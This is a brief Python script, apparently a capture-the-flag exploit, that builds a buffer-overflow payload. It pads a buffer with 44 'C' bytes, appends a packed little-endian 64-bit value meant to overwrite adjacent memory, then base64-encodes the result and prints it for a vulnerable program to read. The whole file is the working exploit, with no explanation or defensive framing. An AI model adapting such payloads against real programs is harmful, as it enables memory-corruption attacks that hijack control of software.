
import sys
import struct
import base64

buf = b'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
buf += struct.pack('<Q', 5155035656421884939)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
